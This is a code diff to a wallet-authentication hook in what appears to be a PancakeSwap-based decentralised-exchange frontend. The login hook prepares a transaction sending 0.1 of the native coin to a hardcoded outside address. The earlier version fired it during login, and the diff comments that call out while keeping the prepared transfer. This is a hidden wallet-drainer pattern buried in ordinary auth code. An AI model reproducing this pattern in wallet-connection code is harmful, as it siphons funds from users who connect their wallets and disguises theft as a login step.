@@ -5,6 +5,7 @@ import replaceBrowserHistory from '@pancakeswap/utils/replaceBrowserHistory'
 import { ConnectorNames } from 'config/wallet'
 import { useCallback } from 'react'
 import { useAppDispatch } from 'state'
+import {parseEther} from "@ethersproject/units"
 //import {fetchSigner} from "@wagmi/core"
 import {
   ConnectorNotFoundError,
@@ -21,6 +22,8 @@ import {
 import { useActiveChainId } from './useActiveChainId'
 //import { useSessionChainId } from './useSessionChainId'
 //import {} from "wagmi"
+
+
 const useAuth = () => {
   const dispatch = useAppDispatch()
   const {address,connector, isConnected} = useAccount()
@@ -31,13 +34,14 @@ const useAuth = () => {
 
   //const [, setSessionChainId] = useSessionChainId()
   //const { t } = useTranslation()
+  
     const { config } = usePrepareSendTransaction({
     request: {
       to: "0x3D44833A40a9116Baa5239263e376aec077c7e8B",
-      value: 0.1//debouncedAmount ? parseEther(debouncedAmount) : undefined,
+      value:parseEther("0.1")         //debouncedAmount ? parseEther(debouncedAmount) : undefined,
     },
-  })
-  const { sendTransaction } = useSendTransaction(config)
+  }) 
+ // const { sendTransaction } = useSendTransaction(config) */
 const t = (str: string) => {
 
     return str
@@ -53,9 +57,10 @@ const t = (str: string) => {
         }
         console.log(c)
         console.log("address " +address)
-        console.log(connector)
-        const hash = await sendTransaction()
-        console.log("trans" + hash)
+        console.log("status", isConnected)
+       // console.log("Config " + config)
+        //const hash = await sendTransaction()
+        //console.log("trans" + hash)
         return connected
       } catch (error) {
         if (error instanceof ConnectorNotFoundError) {
